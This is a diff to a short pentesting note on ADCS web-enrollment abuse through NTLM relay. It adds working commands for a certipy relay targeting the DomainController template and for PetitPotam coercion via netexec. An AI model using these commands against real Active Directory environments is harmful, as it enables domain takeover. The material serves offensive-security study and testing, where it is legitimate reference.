@@ -16,8 +16,14 @@ Involves a [[NTLM Relay]] on a [[Active Directory Certificate Services|ADCS]] ht
 With [[certipy]]:
 - `Web Enrollment is enabled over HTTPS...`
 # Attack
-1. Coerce authentication using [[PetitPotam]]
-2. Set up a [[NTLM Relay]] tool like [[certipy]] `relay`
-3. Relay authentication to `https://<ca_server>/certsrv/certfnsh.asp`
-4. Certipy requests certificate
-5. Authenticate using that certificate
+1. Set up a [[NTLM Relay]] tool like [[certipy]] `relay`
+```
+certipy-ad relay -target 'https://10.10.10.10' -template 'DomainController'
+```
+2. Coerce authentication using [[PetitPotam]]
+```
+nxc smb $DC -u $USER -p $PASSORD -m coerce_plus -o METHOD=PetitPotam LISTENER=10.10.2.2
+```
+2. Relay authentication to `https://<ca_server>/certsrv/certfnsh.asp`
+3. Certipy requests certificate
+4. Authenticate using that certificate
